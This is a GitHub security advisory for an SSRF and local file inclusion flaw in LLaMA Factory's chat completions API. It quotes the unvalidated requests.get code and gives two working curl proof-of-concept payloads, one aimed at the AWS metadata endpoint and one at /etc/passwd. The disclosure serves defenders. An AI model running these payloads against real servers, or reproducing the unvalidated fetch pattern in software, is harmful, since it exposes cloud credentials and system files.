# [H] LLaMA Factory's Chat API Contains Critical SSRF and LFI Vulnerabilities

## Summary
Severity: High
Advisory: GHSA-527m-2xhr-j27g
CVE: CVE-2025-61784
CWE: CWE-22, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2025-10-07
Source: https://github.com/advisories/GHSA-527m-2xhr-j27g
Type: github-advisory

## Affected
- PyPI: `llamafactory` — affected >=0 <0.9.4

## Details
## Summary ##

A Server-Side Request Forgery (SSRF) vulnerability in the chat API allows any authenticated user to force the server to make arbitrary HTTP requests to internal and external networks. This can lead to the exposure of sensitive internal services, reconnaissance of the internal network, or interaction with third-party services. The same mechanism also allows for a Local File Inclusion (LFI) vulnerability, enabling users to read arbitrary files from the server's filesystem.

## Details ##
The vulnerability exists in the _process_request function within src/llamafactory/api/chat.py. This function is responsible for processing incoming multimodal content, including images, videos, and audio provided via URLs.

The function checks if the provided URL is a base64 data URI or a local file path (os.path.isfile). If neither is true, it falls back to treating the URL as a web URI and makes a direct HTTP GET request using requests.get(url, stream=True).raw without any validation or sanitization of the URL.

Vulnerable Code Snippets in _process_request:
```
# ...
        elif input_item.type == "image_url":
            # ...
            else:  # web uri
                image_stream = requests.get(image_url, stream=True).raw
# ...
        elif input_item.type == "video_url":
            # ...
            else:  # web uri
                video_stream = requests.get(video_url, stream=True).raw
# ...
        elif input_item.type == "audio_url":
            # ...
            else:  # web uri
                audio_stream = requests.get(audio_url, stream=True).raw
# ...
```
This vulnerable function is called by create_chat_completion_response and create_stream_chat_completion_response, which are in turn called by the public-facing /v1/chat/completions API endpoint in src/llamafactory/api/app.py. A user can craft a request to this endpoint containing a malicious URL in the messages payload to trigger the vulnerability.

## PoC ##
To reproduce the vulnerability, send a POST request to the /v1/chat/completions endpoint with a JSON payload containing a URL that points to an internal or controlled external service.

Start the LLaMA Factory API server.

Use curl to send the malicious request. The following example uses a URL pointing to the AWS metadata service, a common SSRF attack vector.

SSRF Payload:
```
curl -X POST "http://127.0.0.1:8000/v1/chat/completions" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer your_api_key" \
-d '{
  "model": "your-model-name",
  "messages": [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "What is in this image?"
        },
        {
          "type": "image_url",
          "image_url": {
            "url": "http://169.254.169.254/latest/meta-data/"
          }
        }
      ]
    }
  ]
}'
```
LFI Payload:
```
curl -X POST "http://127.0.0.1:8000/v1/chat/completions" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer your_api_key" \
-d '{
  "model": "your-model-name",
  "messages": [
    {
      "role": "user",
      "content": [
        {
          "type": "text",
          "text": "What is in this image?"
        },
        {
          "type": "image_url",
          "image_url": {
            "url": "/etc/passwd"
          }
        }
      ]
    }
  ]
}'
```
The server will make a request to the specified URL or read the specified local file.

## Impact ##
Vulnerability Type: Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI).

Impacted Component: The API server, specifically the /v1/chat/completions endpoint.

Who is impacted: Any user who can send requests to the chat API. The vulnerability allows an attacker to bypass firewalls and access internal network resources, query cloud metadata services for credentials, or read sensitive files on the server. The severity is critical.

## Credits
Wenhao Wu, ChengGao, Alibaba Cloud Intelligence Security Team

## References
- https://github.com/hiyouga/LlamaFactory/security/advisories/GHSA-527m-2xhr-j27g
- https://nvd.nist.gov/vuln/detail/CVE-2025-61784
- https://github.com/hiyouga/LLaMAFactory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9
- https://github.com/hiyouga/LLaMA-Factory
